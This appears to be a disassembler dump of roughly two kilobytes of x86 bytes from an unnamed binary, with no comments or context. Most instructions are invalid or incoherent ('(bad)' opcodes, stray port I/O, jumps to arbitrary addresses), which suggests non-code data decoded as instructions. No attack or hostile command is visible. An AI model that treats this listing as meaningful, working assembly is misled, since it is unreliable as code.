  428afe:	arpl   WORD PTR [ebx+ecx*4],bx
  428b01:	add    BYTE PTR [eax],al
  428b03:	add    BYTE PTR [eax],al
  428b05:	add    BYTE PTR [esi+ebp*4-0x56e17c0],bh
  428b0c:	out    0xff,eax
  428b0e:	repnz out dx,al
  428b10:	repz es dec esi
  428b13:	mov    DWORD PTR [ebx+ecx*4],edx
  428b16:	mov    esp,0x7572e7ae
  428b1b:	xor    DWORD PTR [edx+0x10],eax
  428b1e:	xchg   DWORD PTR [esi],ecx
  428b20:	loope  0x428b1c
  428b22:	cs cld 
  428b24:	repz adc dl,al
  428b27:	imul   edx,DWORD PTR [ecx*4+0x5593b27b],0xe83e6439
  428b32:	cmp    bh,dh
  428b34:	out    0xff,eax
  428b36:	mov    ds:0x7fc193ec,al
  428b3b:	pop    ecx
  428b3c:	stos   BYTE PTR es:[edi],al
  428b3d:	or     al,0x29
  428b3f:	arpl   WORD PTR [ebp-0x6a9b2814],dx
  428b45:	stc    
  428b46:	sub    BYTE PTR [ecx+0x18],0x8b
  428b4a:	imul   BYTE PTR [ebx+0x54]
  428b4d:	jne    0x428b3a
  428b4f:	out    0xf5,al
  428b51:	call   0x515ae7
  428b56:	bound  eax,QWORD PTR [esi]
  428b58:	xchg   edx,eax
  428b59:	mul    BYTE PTR ds:0x24ff3e9d
  428b5f:	mov    eax,0x81aecf93
  428b64:	adc    al,0xe8
  428b66:	sbb    ebp,edi
  428b68:	out    0xff,eax
  428b6a:	add    BYTE PTR [eax],al
  428b6c:	add    BYTE PTR [eax],al
  428b6e:	add    BYTE PTR [eax-0x728bacf2],dl
  428b74:	adc    al,0xd6
  428b76:	prefetch (bad)
  428b77:	or     eax,0x18fdbee3
  428b7c:	mov    ebx,DWORD PTR [ebp-0x626d443e]
  428b82:	retf   0x6ca8
  428b85:	cmp    eax,0x52bc9000
  428b8a:	pop    ebx
  428b8b:	out    dx,al
  428b8c:	ficom  WORD PTR [esp+ecx*1-0x70]
  428b90:	ficomp WORD PTR [ebx-0x1fa2ee14]
  428b96:	std    
  428b97:	ja     0x428b22
  428b99:	xchg   edi,eax
  428b9a:	test   DWORD PTR [esi+ebx*2+0x49],esp
  428b9e:	sti    
  428b9f:	mov    esi,0xe850a1b9
  428ba4:	or     DWORD PTR [eax],edx
  428ba6:	add    BYTE PTR [ebx+eax*8-0x3cbd78ee],cl
  428bad:	push   cs
  428bae:	xchg   DWORD PTR [ecx-0x1e],esp
  428bb1:	jp     0x428bb2
  428bb3:	mov    ebx,0x5085492f
  428bb8:	popf   
  428bb9:	sbb    al,0x66
  428bbb:	nop
  428bbc:	push   cs
  428bbd:	(bad)  
  428bbe:	hlt    
  428bbf:	and    eax,0x1f504928
  428bc4:	xchg   BYTE PTR [eax],al
  428bc6:	push   cs
  428bc7:	ror    BYTE PTR [ecx-0x557b3f71],1
  428bcd:	mov    al,ds:0x90716150
  428bd2:	add    BYTE PTR [eax],al
  428bd4:	add    BYTE PTR [eax],al
  428bd6:	add    BYTE PTR [eax],al
  428bd8:	nop
  428bd9:	mov    eax,edi
  428bdb:	xor    eax,DWORD PTR [edi]
  428bdd:	dec    ecx
  428bde:	adc    BYTE PTR [ebp-0x4b91afb],cl
  428be4:	out    0x9b,eax
  428be6:	pop    ebx
  428be7:	call   0xfb88efae
  428bec:	or     eax,0x250a35b2
  428bf1:	jb     0x428bf4
  428bf3:	add    eax,0x4ca47276
  428bf8:	(bad)  
  428bf9:	mov    ch,0xf5
  428bfb:	mov    al,0xe
  428bfd:	mov    es,WORD PTR [edi-0x7961aa78]
  428c03:	mov    ch,0xaa
  428c05:	cmp    BYTE PTR [ebx+0x43],0x24
  428c09:	adc    al,0x71
  428c0b:	enter  0x79b,0xbe
  428c0f:	jno    0x428ba1
  428c11:	popf   
  428c12:	int    0x8d
  428c14:	cmp    BYTE PTR [eax],0xcc
  428c17:	ror    al,1
  428c19:	popf   
  428c1a:	inc    ebx
  428c1b:	or     al,0x7b
  428c1d:	in     eax,0xd4
  428c1f:	out    dx,eax
  428c20:	scas   eax,DWORD PTR es:[edi]
  428c21:	ret    0x435
  428c24:	or     eax,0xc3152a73
  428c29:	popf   
  428c2a:	and    ecx,DWORD PTR [eax]
  428c2c:	mov    edx,cr6
  428c2f:	xchg   ebp,edx
  428c31:	stos   BYTE PTR es:[edi],al
  428c32:	std    
  428c33:	sti    
  428c34:	in     al,dx
  428c35:	repnz cmc 
  428c37:	mov    bl,0x37
  428c39:	popf   
  428c3a:	push   ds
  428c3b:	pop    edx
  428c3c:	add    BYTE PTR [eax],al
  428c3e:	add    BYTE PTR [eax],al
  428c40:	add    BYTE PTR [ebx],bh
  428c42:	xor    bh,BYTE PTR [edx-0x138ceaf8]
  428c48:	icebp  
  428c49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428c4a:	mov    ?,edx
  428c4c:	pop    eax
  428c4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428c4e:	stos   BYTE PTR es:[edi],al
  428c4f:	push   es
  428c50:	lea    ecx,[ebx-0x75]
  428c53:	jbe    0x428bee
  428c55:	nop
  428c56:	mov    dl,0x60
  428c58:	(bad)  
  428c59:	(bad)
  428c5d:	nop
  428c5e:	mov    dl,0xbc
  428c60:	mov    edx,cs
  428c62:	mov    ah,BYTE PTR [ebp+0x2cb2902d]
  428c68:	iret   
  428c69:	jmp    0x428c08
  428c6b:	paddusb mm6,mm3
  428c6e:	scas   eax,DWORD PTR es:[edi]
  428c6f:	dec    esi
  428c70:	jmp    0xf213f78e
  428c75:	xchg   ebx,eax
  428c76:	sbb    eax,0x6fc9dfb
  428c7b:	inc    ebp
  428c7c:	mov    esi,0x9d96a50c
  428c81:	xchg   edi,eax
  428c82:	mov    edx,0x228f9d99
  428c87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428c88:	push   es
  428c89:	mov    WORD PTR [edx-0x2e479ff2],?
  428c8f:	add    DWORD PTR ss:[eax+0x7],edx
  428c93:	psubsw mm2,QWORD PTR [esi]
  428c96:	div    BYTE PTR [edx]
  428c98:	pop    ecx
  428c99:	cmp    al,0x98
  428c9b:	add    ch,BYTE PTR [ecx+0x620edd85]
  428ca1:	mov    ebx,0xd4b2b
  428ca6:	add    BYTE PTR [eax],al
  428ca8:	add    BYTE PTR [eax],al
  428caa:	mov    eax,0xe7eec837
  428caf:	mov    dh,0xd
  428cb1:	jmp    0x585bc49
  428cb6:	adc    al,0x5a
  428cb8:	imul   ecx
  428cba:	xchg   ebx,eax
  428cbb:	mov    dl,0xf6
  428cbd:	xor    al,0xf7
  428cbf:	pushf  
  428cc0:	in     al,dx
  428cc1:	bound  ecx,QWORD PTR [esi-0x73d6feae]
  428cc7:	das    
  428cc8:	push   ebx
  428cc9:	int    0xeb
  428ccb:	in     al,dx
  428ccc:	aas    
  428ccd:	jle    0x428d30
  428ccf:	das    
  428cd0:	inc    ebx
  428cd1:	int    0x8f
  428cd3:	pop    ebx
  428cd4:	imul   cl
  428cd6:	xchg   ebx,eax
  428cd7:	mov    dl,0x95
  428cd9:	lods   eax,DWORD PTR ds:[esi]
  428cda:	scas   eax,DWORD PTR es:[edi]
  428cdb:	(bad)  
  428cdc:	not    BYTE PTR [edi+esi*1]
  428cdf:	popf   
  428ce0:	in     al,dx
  428ce1:	fs aas 
  428ce3:	shl    DWORD PTR [edx],1
  428ce5:	mov    ecx,0xc5983c
  428cea:	bound  ecx,QWORD PTR [ecx]
  428cec:	call   0xe9ea:0xa7728d54
  428cf3:	mov    al,0xe
  428cf5:	mov    DWORD PTR ds:0x90e81ebd,edx
  428cfb:	dec    ebp
  428cfc:	in     al,dx
  428cfd:	push   DWORD PTR [ebx*2+0x65f94430]
  428d04:	jmp    0x30c7b7df
  428d09:	adc    al,0xb9
  428d0b:	sub    eax,0x89df
  428d10:	add    BYTE PTR [eax],al
  428d12:	add    BYTE PTR ds:0x2d0f32bd,bl
  428d18:	pop    ds
  428d19:	verw   WORD PTR [ecx-0x2f005e5]
  428d20:	and    BYTE PTR [edi],cl
  428d22:	add    BYTE PTR [ecx+0x33],bh
  428d25:	loope  0x428d36
  428d27:	in     eax,dx
  428d28:	sub    BYTE PTR [edi],cl
  428d2a:	add    BYTE PTR [ecx+0x3f],ch
  428d2d:	add    ecx,DWORD PTR [edi+0x37f6b6b9]
  428d33:	in     eax,0xb6
  428d35:	push   cs
  428d36:	(bad)  
  428d37:	cmp    al,0x84
  428d39:	(bad)  
  428d3a:	aas    
  428d3b:	imul   ebp,DWORD PTR [ecx],0x3f483f7
  428d41:	arpl   WORD PTR [esi],cx
  428d43:	jle    0x428d48
  428d45:	arpl   WORD PTR [eax*2+0x178bc229],sp
  428d4c:	shld   esi,edi,0x16
  428d50:	add    al,0x9a
  428d52:	inc    esp
  428d53:	dec    ebp
  428d54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428d55:	pop    esp
  428d56:	lea    ebp,[ebp-0x2e]
  428d59:	xor    dl,BYTE PTR [eax-0x6d]
  428d5c:	mov    ch,0x3b
  428d5e:	test   BYTE PTR [edi+0x4e],0xe9
  428d62:	push   esp
  428d63:	(bad)  
  428d64:	into   
  428d65:	xchg   ecx,eax
  428d66:	rcl    BYTE PTR [eax+0x4c86d77d],0xb5
  428d6d:	out    0x84,al
  428d6f:	rcr    BYTE PTR [ebp+0x7],1
  428d72:	xchg   DWORD PTR [ebp+esi*4+0x2e],eax
  428d76:	xchg   DWORD PTR [eax],eax
  428d78:	add    BYTE PTR [eax],al
  428d7a:	add    BYTE PTR [eax],al
  428d7c:	ficom  WORD PTR [eax]
  428d7e:	lahf   
  428d7f:	and    esi,DWORD PTR [eax-0x67ed28f0]
  428d85:	push   cs
  428d86:	pop    edx
  428d87:	je     0x428d16
  428d89:	or     BYTE PTR [edx+0x4],cl
  428d8c:	inc    ebp
  428d8d:	lahf   
  428d8e:	cdq    
  428d8f:	adc    al,0x9f
  428d91:	sbb    BYTE PTR [edi],0x74
  428d94:	xor    DWORD PTR [esi+edi*4+0x58207823],0xfffffffb
  428d9c:	and    al,0x6d
  428d9e:	in     al,0xe7
  428da0:	mov    eax,DWORD PTR es:[ebp-0x5]
  428da4:	sbb    ecx,ebp
  428da6:	cs sbb al,0xce
  428da9:	or     BYTE PTR ds:0xbe79bb0c,ch
  428daf:	int3   
  428db0:	or     ecx,ebp
  428db2:	cs sub al,0x6f
  428db5:	(bad)  [esi]
  428db7:	and    BYTE PTR [edi-0x3b],ah
  428dba:	cs xor al,0xc3
  428dbd:	fistp  QWORD PTR fs:[ebx+0x5b12c982]
  428dc4:	out    dx,al
  428dc5:	mul    BYTE PTR [edi+0x4fbd4c7e]
  428dcb:	mov    edx,0xae86bf5
  428dd0:	pop    esi
  428dd1:	iret   
  428dd2:	fistp  DWORD PTR [esi-0x47969f86]
  428dd8:	stos   DWORD PTR es:[edi],eax
  428dd9:	(bad)  
  428dda:	push   ebx
  428ddb:	pusha  
  428ddc:	inc    edi
  428ddd:	retf   
  428dde:	cmp    ecx,ebx
  428de0:	add    BYTE PTR [eax],al
  428de2:	add    BYTE PTR [eax],al
  428de4:	add    BYTE PTR [esi+0x68],dl
  428de7:	and    bh,BYTE PTR [ecx-0x42]
  428dea:	mov    dl,0x20
  428dec:	imul   BYTE PTR [esi-0x4853c608]
  428df2:	jae    0x428e16
  428df4:	jns    0x428de5
  428df6:	retf   
  428df7:	mov    bl,0x46
  428df9:	fcmovnb st,st(3)
  428dfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428dfc:	aad    0xee
  428dfe:	retf   
  428dff:	and    BYTE PTR [eax+eiz*4-0x10b9678c],ch
  428e06:	retf   
  428e07:	mov    ds:0x2108130e,eax
  428e0c:	dec    ecx
  428e0d:	xor    bl,BYTE PTR [eax+0x1d]
  428e10:	inc    esi
  428e11:	test   eax,0x71f330cb
  428e16:	je     0x428dc1
  428e18:	fld    QWORD PTR [ebx-0x4c455a7f]
  428e1e:	inc    edi
  428e1f:	fdivr  DWORD PTR [edx-0x49]
  428e22:	retf   
  428e23:	aas    
  428e24:	dec    ecx
  428e25:	xor    cl,BYTE PTR [eax]
  428e27:	in     eax,dx
  428e28:	lea    eax,[edi+0x56]
  428e2b:	gs xchg ebp,eax
  428e2d:	cmp    ebx,DWORD PTR [ecx]
  428e2f:	sbb    eax,esp
  428e31:	push   edx
  428e32:	retf   0xf5b0
  428e35:	scas   al,BYTE PTR es:[edi]
  428e36:	ror    DWORD PTR [ecx+ecx*8],cl
  428e39:	jbe    0x428e04
  428e3b:	mov    al,ds:0x8cad1afc
  428e40:	jns    0x428e2a
  428e42:	in     al,dx
  428e43:	aam    0x81
  428e45:	outs   dx,DWORD PTR ds:[esi]
  428e46:	push   ds
  428e47:	loop   0x428dce
  428e49:	add    BYTE PTR [eax],al
  428e4b:	add    BYTE PTR [eax],al
  428e4d:	add    BYTE PTR [edi],ah
  428e4f:	xlat   BYTE PTR ds:[ebx]
  428e50:	pusha  
  428e51:	jns    0x428e05
  428e53:	xor    al,0x9d
  428e55:	dec    ebx
  428e56:	sub    ecx,ecx
  428e58:	mov    al,0xe0
  428e5a:	sbb    ch,BYTE PTR [ebp-0x530d1160]
  428e60:	inc    esp
  428e61:	out    dx,al
  428e62:	adc    cl,BYTE PTR [esi]
  428e64:	mov    eax,ds:0xf8904d1
  428e69:	mov    ebp,0x7e791437
  428e6e:	adc    eax,0x8932bd1a
  428e73:	xchg   ecx,eax
  428e74:	ins    DWORD PTR es:[edi],dx
  428e75:	jg     0x428e65
  428e77:	push   esp
  428e78:	sbb    DWORD PTR [esi+0x15f990e1],ecx
  428e7e:	lock adc edi,DWORD PTR [ecx+0x56]
  428e82:	std    
  428e83:	popa   
  428e84:	mov    al,0x66
  428e86:	add    eax,0x1ce4d52e
  428e8b:	(bad)  
  428e8c:	mov    ebp,0x5d6d7ca7
  428e91:	retf   0xc66d
  428e94:	cmp    al,0x32
  428e96:	scas   al,BYTE PTR es:[edi]
  428e97:	push   esp
  428e98:	sbb    DWORD PTR [edx-0x1f],eax
  428e9b:	or     edx,edi
  428e9d:	aad    0xcf
  428e9f:	adc    ebp,DWORD PTR [ecx+0x3d8b5916]
  428ea5:	xor    al,BYTE PTR [ebx-0x6f]
  428ea8:	mov    al,0x6e
  428eaa:	std    
  428eab:	sub    eax,0x9191edd5
  428eb0:	cmp    eax,0x5c
  428eb5:	add    BYTE PTR [eax],al
  428eb7:	push   edi
  428eb8:	(bad)  
  428eb9:	cmp    eax,0x48d084b2
  428ebe:	outs   dx,DWORD PTR ds:[esi]
  428ebf:	mov    bl,0xf5
  428ec1:	push   eax
  428ec2:	pop    esi
  428ec3:	call   0x75f15fd2
  428ec8:	pop    esp
  428ec9:	sbb    edx,ecx
  428ecb:	arpl   WORD PTR [ecx-0x6e877b2c],di
  428ed1:	cmp    eax,0x2c3c091e
  428ed6:	xor    DWORD PTR [ebp-0x6c],edx
  428ed9:	mov    al,0x6e
  428edb:	and    al,0x59
  428edd:	ins    DWORD PTR es:[edi],dx
  428ede:	sub    DWORD PTR [esi-0x7],ecx
  428ee1:	icebp  
  428ee2:	retf   0x42ce
  428ee5:	mov    edi,0x70efe500
  428eea:	push   0xe
  428eec:	(bad)  
  428eed:	mov    ds:0xb80a3e46,eax
  428ef2:	cs inc ebp
  428ef4:	das    
  428ef5:	mov    al,ds:0x771a8238
  428efa:	jmp    0x1c82:0xa7987b6
  428f01:	hlt    
  428f02:	cs (bad) 
  428f05:	add    bh,BYTE PTR [ebx]
  428f07:	cli    
  428f08:	sub    esi,DWORD PTR [esi+ebp*1+0x62711ad1]
  428f0f:	dec    esi
  428f10:	cli    
  428f11:	cmp    DWORD PTR [edi],ebp
  428f13:	jb     0x428ef0
  428f15:	mov    cl,0x5b
  428f17:	jmp    0x428ebc
  428f19:	xor    al,0x71
  428f1b:	add    BYTE PTR [eax],al
  428f1d:	add    BYTE PTR [eax],al
  428f1f:	add    BYTE PTR [edi+edx*8-0x62],al
  428f23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428f24:	iret   
  428f25:	(bad)  
  428f26:	stos   DWORD PTR es:[edi],eax
  428f27:	push   ebp
  428f28:	xor    dl,BYTE PTR [ecx]
  428f2a:	mov    gs,esp
  428f2c:	fstp   DWORD PTR [eax+0x46faffec]
  428f32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428f33:	out    dx,al
  428f34:	test   al,0xb4
  428f36:	push   cs
  428f37:	push   esi
  428f38:	sub    BYTE PTR [eax+eax*8-0x18514a90],cl
  428f3f:	adc    eax,0x2c9cbd
  428f44:	jmp    0xe9f6:0xcc8d1aea
  428f4b:	dec    DWORD PTR [esi-0x9]
  428f4e:	mov    ?,WORD PTR [edi-0x6a65fbe2]
  428f54:	rol    DWORD PTR [eax+ebp*8],1
  428f57:	call   ebx
  428f59:	sahf   
  428f5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428f5b:	les    ebp,FWORD PTR [ecx+0x4de7ec6a]
  428f61:	mov    esp,0x7c90000e
  428f66:	cmp    eax,0xdbbf5085
  428f6b:	mov    WORD PTR ds:0x1ffb3fb4,ss
  428f71:	inc    edx
  428f72:	test   eax,0x978990d4
  428f77:	ror    BYTE PTR [eax+0x1513ccd3],0x5f
  428f7e:	cmp    BYTE PTR [ecx+0x60],dl
  428f81:	push   es
  428f82:	xchg   esi,eax
  428f83:	jbe    0x428f85
  428f85:	add    BYTE PTR [eax],al
  428f87:	add    BYTE PTR [eax],al
  428f89:	test   DWORD PTR [eax],0x5c435040
  428f8f:	inc    ecx
  428f90:	adc    eax,0xffd07be8
  428f95:	adc    al,0xca
  428f97:	shr    BYTE PTR [edi],0x6e
  428f9a:	mov    ds:0x5de644bc,al
  428f9f:	in     al,dx
  428fa0:	jle    0x428f6a
  428fa2:	xchg   ebp,eax
  428fa3:	mov    edi,0xf8e28323
  428fa8:	mov    BYTE PTR [esi+eax*2+0x38],al
  428fac:	lea    edx,[ebp-0x1f]
  428faf:	mov    ds:0xd43df4b5,al
  428fb4:	dec    DWORD PTR [edi+eax*1]
  428fb7:	jae    0x428fb0
  428fb9:	xchg   edi,eax
  428fba:	mov    al,ds:0x87650b48
  428fbf:	inc    ecx
  428fc0:	test   DWORD PTR [eax-0x60],edx
  428fc3:	rcl    BYTE PTR [si],0x49
  428fc7:	(bad)  
  428fc8:	or     bl,al
  428fca:	dec    ecx
  428fcb:	test   BYTE PTR [eax-0x4a296eb],0x67
  428fd2:	jo     0x428fdb
  428fd4:	test   al,0xec
  428fd6:	int    0x12
  428fd8:	lea    ecx,ds:0x4ffb5d69
  428fde:	mov    ecx,0xb28c153f
  428fe3:	out    0xc3,al
  428fe5:	aas    
  428fe6:	cs mov dh,0x93
  428fe9:	xchg   ecx,eax
  428fea:	push   ds
  428feb:	clc    
  428fec:	jge    0x428fee
  428fee:	add    BYTE PTR [eax],al
  428ff0:	add    BYTE PTR [eax],al
  428ff2:	out    dx,eax
  428ff3:	and    al,0x4b
  428ff5:	pop    ebx
  428ff6:	and    eax,0x797b9597
  428ffb:	icebp  
  428ffc:	cmp    ebx,ecx
  428ffe:	sbb    eax,0x4f3d00f8
  429003:	std    
  429004:	jo     0x429065
  429006:	adc    DWORD PTR [esi-0x4d6ff63e],eax
  42900c:	jp     0x428fc6
  42900e:	jecxz  0x429012
  429010:	lods   al,BYTE PTR ds:[esi]
  429011:	mov    edx,0x3f68b28
  429016:	nop
  429017:	in     al,0x30
  429019:	pop    ebx
  42901a:	imul   eax,DWORD PTR [esi+esi*8],0x3
  42901e:	add    eax,0xcab309ed
  429023:	mov    esp,0xb287f535
  429028:	pusha  
  429029:	push   ebx
  42902a:	adc    eax,0x7087fda0
  42902f:	mov    ah,0xf5
  429031:	add    ebx,DWORD PTR ds:0xb48c41fd
  429037:	mov    cl,0xf5
  429039:	add    ebp,DWORD PTR [eax-0x6ffc7851]
  42903f:	and    eax,0xfce097bb
  429044:	cld    
  429045:	mul    DWORD PTR [edi]
  429047:	shl    DWORD PTR ds:0x42731504,0xd9
  42904e:	add    al,0xe8
  429050:	shl    DWORD PTR [ebx+0x4f8e281c],0x0
  429057:	add    BYTE PTR [eax],al
  429059:	add    BYTE PTR [eax],al
  42905b:	imul   edx,DWORD PTR [esi-0x692ab6f9],0xfffffff2
  429062:	add    dl,BYTE PTR [eax-0x7b49f14e]
  429068:	(bad)
  42906b:	xchg   ebp,eax
  42906c:	jae    0x4290d0
  42906e:	inc    ebp
  42906f:	mov    edi,0xe1a2af2f
  429074:	cdq    
  429075:	aas    
  429076:	cmp    BYTE PTR [esi-0x67],cl
  429079:	jns    0x429061
  42907b:	inc    ebp
  42907c:	xchg   esi,eax
  42907d:	in     eax,dx
  42907e:	fdiv   QWORD PTR [edi]
  429080:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429081:	dec    esi
  429082:	jmp    0x2da50395
  429087:	(bad)  
  429088:	das    
  429089:	mov    bh,0x6c
  42908b:	popa   
  42908c:	cdq    
  42908d:	aas    
  42908e:	popw   es
  429090:	push   es
  429091:	add    DWORD PTR [ecx+0x55522b93],ebp
  429097:	and    al,0x27
  429099:	xchg   edx,eax
  42909a:	mov    DWORD PTR [ebp-0x67],edx
  42909d:	in     al,dx
  42909e:	cdq    
  42909f:	pop    esi
  4290a0:	das    
  4290a1:	mov    bh,0x3c
  4290a3:	inc    ecx
  4290a4:	cdq    
  4290a5:	aas    
  4290a6:	ss (bad) 
  4290a8:	push   ecx
  4290a9:	add    BYTE PTR [ecx-0x6330d06d],ch
  4290af:	lods   al,BYTE PTR ds:[esi]
  4290b0:	sub    al,0x52
  4290b2:	sbb    eax,0x12af3f37
  4290b7:	inc    ecx
  4290b8:	cdq    
  4290b9:	jns    0x4290c9
  4290bb:	daa    
  4290bc:	mov    esi,0x7450
  4290c1:	add    BYTE PTR [eax],al
  4290c3:	add    BYTE PTR [edi],bl
  4290c5:	push   edx
  4290c6:	call   0x4bccd1c9
  4290cb:	mov    ds:0x2aed99e1,al
  4290d0:	dec    edx
  4290d1:	cwde   
  4290d2:	add    ah,BYTE PTR [ebp+0x650ed585]
  4290d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4290d9:	test   eax,0xb2935792
  4290de:	push   cs
  4290df:	sbb    esi,DWORD PTR [ebp+0x19007215]
  4290e5:	mov    cl,0x6b
  4290e7:	gs adc eax,0x94599b1
  4290ed:	popa   
  4290ee:	fwait
  4290ef:	inc    ebp
  4290f0:	add    eax,0x1d459b61
  4290f5:	popa   
  4290f6:	jb     0x4290f7
  4290f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4290f9:	ins    BYTE PTR es:[edi],dx
  4290fa:	call   0x74ef244f
  4290ff:	add    BYTE PTR [ebx+0x5515e7ae],dl
  429105:	sahf   
  429106:	sub    al,0x0
  429108:	mov    ds:0xdff91e9,al
  42910d:	xchg   ebp,eax
  42910e:	(bad)  
  42910f:	call   DWORD PTR [ebx]
  429111:	mov    cl,0xe
  429113:	add    BYTE PTR [esi],al
  429115:	sub    al,0xf1
  429117:	add    cl,ch
  429119:	mov    al,0x93
  42911b:	dec    ebp
  42911c:	inc    ebp
  42911d:	sub    al,0xd6
  42911f:	(bad)  
  429121:	repnz push cs
  429123:	add    cl,ch
  429125:	mov    ebp,0x39e0
  42912a:	add    BYTE PTR [eax],al
  42912c:	add    BYTE PTR [edi*8-0x4ebb79e9],bl
  429133:	push   cs
  429134:	add    BYTE PTR [esp+ebp*2-0x1c],ah
  429138:	push   eax
  429139:	and    ebx,DWORD PTR [edx+0x775834e9]
  42913f:	in     al,dx
  429140:	(bad)  
  429141:	lods   al,BYTE PTR ds:[esi]
  429142:	test   al,0x1b
  429144:	inc    eax
  429145:	mov    ecx,0x2c0fcf2b
  42914a:	sbb    cl,BYTE PTR [edi]
  42914c:	add    BYTE PTR [ecx-0x307a5eb],ch
  429152:	fcom   DWORD PTR [edi]
  429154:	test   ch,ah
  429156:	scas   eax,DWORD PTR es:[edi]
  429157:	push   cs
  429158:	add    BYTE PTR [edx],al
  42915a:	push   esi
  42915b:	sbb    al,0x8d
  42915d:	cld    
  42915e:	ss jmp 0xe87:0x4b7c90ff
  429166:	mov    dl,BYTE PTR [eax]
  429168:	test   BYTE PTR [eax-0x2a],dl
  42916b:	ror    DWORD PTR [ebp+ecx*1+0x4ffb582a],0xf
  429173:	data16 test al,0x45
  429176:	inc    ebp
  429177:	pop    esp
  429178:	push   eax
  429179:	or     esp,DWORD PTR [eax+0x4b]
  42917c:	arpl   WORD PTR [ebx+0x34],sp
  42917f:	pop    esp
  429180:	test   DWORD PTR [eax-0x4a],edx
  429183:	mov    ecx,0x3df2158c
  429188:	sti    
  429189:	pop    ds
  42918a:	inc    edx
  42918b:	mov    edx,0x97151647
  429190:	rol    BYTE PTR [eax],0x0
  429193:	add    BYTE PTR [eax],al
  429195:	add    BYTE PTR [edi+ecx*8+0x2328858d],al
  42919c:	pop    esp
  42919d:	sti    
  42919e:	pusha  
  42919f:	pop    edx
  4291a0:	mov    ds:0x108a1067,eax
  4291a5:	add    al,0x78
  4291a7:	mov    ch,0x6b
  4291a9:	inc    eax
  4291aa:	nop
  4291ab:	mul    BYTE PTR [ebp-0x58]
  4291ae:	fucomp st(4)
  4291b0:	pop    ebx
  4291b1:	das    
  4291b2:	leave  
  4291b3:	add    DWORD PTR [ebx-0x6a23318f],edi
  4291b9:	sar    BYTE PTR [ebx+ebp*4],0xc8
  4291bd:	dec    DWORD PTR [edi+edx*1]
  4291c0:	jnp    0x4291bb
  4291c2:	mov    bh,0xb4
  4291c4:	dec    eax
  4291c6:	mov    eax,0x90006250
  4291cb:	or     eax,0x20837453
  4291d0:	into   
  4291d1:	test   DWORD PTR ds:0x8ff97aff,0xa049699c
  4291db:	fcom   DWORD PTR [ecx]
  4291dd:	call   0x4f324441
  4291e2:	jnp    0x429177
  4291e4:	inc    ebx
  4291e5:	dec    esp
  4291e6:	imul   edi,DWORD PTR [ebp-0x4d580ccb],0x70
  4291ed:	rcr    BYTE PTR [ebx-0x14],0x10
  4291f1:	fldenv [ebx-0x5d]
  4291f4:	ja     0x4291b8
  4291f6:	dec    edx
  4291f7:	xchg   ebx,eax
  4291f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4291f9:	mov    ah,0x0
  4291fb:	add    BYTE PTR [eax],al
  4291fd:	add    BYTE PTR [eax],al
  4291ff:	dec    edx
  429200:	mov    ebp,0xb27ff335
  429205:	jbe    0x429255
  429207:	cs mov dl,0xf5
  42920a:	add    ebx,DWORD PTR [ebx+0x2b4d9c2e]
  429210:	xchg   ebx,eax
  429211:	dec    ebx
  429212:	mov    al,dh
  429214:	xchg   esi,eax
  429215:	xchg   ebp,eax
  429216:	dec    esi
  429217:	ror    BYTE PTR [eax],0xf7
  42921a:	(bad)  [edx]
  42921c:	or     bh,ch
  42921e:	adc    DWORD PTR [eax-0x4fbf04e],0xffffffbc
  429225:	fptan  
  429227:	mov    bh,0xb2
  429229:	jb     0x42926e
  42922b:	gs aam 0x72
  42922e:	mov    BYTE PTR [eax],cl
  429230:	cdq    
  429231:	pop    ebp
  429232:	dec    esi
  429233:	inc    eax
  429234:	add    DWORD PTR [edi-0xa4da825],eax
  42923a:	pop    es
  42923b:	cmp    dh,bl
  42923d:	je     0x429202
  42923f:	(bad)  
  429240:	and    eax,0x92c7a343
  429245:	xor    eax,0x1f89c912
  42924a:	fsubr  DWORD PTR [ecx+0x1c437b92]
  429250:	mov    eax,0x3d0d038f
  429255:	outs   dx,BYTE PTR ds:[esi]
  429256:	dec    esp
  429257:	fwait
  429258:	xchg   edx,eax
  429259:	test   eax,0xf4f783c
  42925e:	pop    esp
  42925f:	xchg   ebx,eax
  429260:	mov    dl,0x1b
  429262:	aaa    
  429263:	add    BYTE PTR [eax],al
  429265:	add    BYTE PTR [eax],al
  429267:	add    BYTE PTR [edx-0x6cac30ca],ch
  42926d:	jmp    0xc2d0:0x38bc241b
  429274:	xchg   edx,eax
  429275:	loopne 0x429245
  429277:	cs cs jmp 0x9f563d53
  42927e:	xchg   edi,eax
  42927f:	out    dx,al
  429280:	xchg   ebx,eax
  429281:	mov    dl,0x99
  429283:	gs js  0x42920c
  429286:	psubsw mm2,QWORD PTR [ebx-0x2bc0bdff]
  42928d:	add    ch,BYTE PTR [ebx-0x64c02262]
  429293:	int    0xa1
  429295:	nop
  429296:	in     al,dx
  429297:	jmp    0xea038257
  42929c:	xchg   ebx,eax
  42929d:	cmp    DWORD PTR [edx],esp
  42929f:	add    DWORD PTR [edx],0x8030ed2
  4292a5:	loope  0x42926e
  4292a7:	or     al,0x17
  4292a9:	jae    0x429312
  4292ab:	mov    cl,0x3e
  4292ad:	aas    
  4292ae:	pop    ebx
  4292af:	add    eax,0x643ee2f8
  4292b4:	sbb    bh,dl
  4292b6:	mov    ebx,gs
  4292b8:	xchg   ebx,eax
  4292b9:	mov    dl,0x3e
  4292bb:	call   0xc54:0x64c58d20
  4292c2:	push   ds
  4292c3:	iret   
  4292c4:	call   0x27b8:0xe78f52ee
  4292cb:	sub    al,0x0
  4292cd:	add    BYTE PTR [eax],al
  4292cf:	add    BYTE PTR [eax],al
  4292d1:	(bad)  
  4292d2:	rcr    DWORD PTR [edi],cl
  4292d4:	xor    BYTE PTR [esi-0x4c52a4c6],dh
  4292da:	ds push ebx
  4292dc:	lds    esi,FWORD PTR [ebx+0x3d00a901]
  4292e2:	xchg   edx,eax
  4292e3:	push   eax
  4292e4:	add    ah,bh
  4292e6:	xor    dh,BYTE PTR [ebx]
  4292e8:	or     al,0x76
  4292ea:	mov    ch,0xe
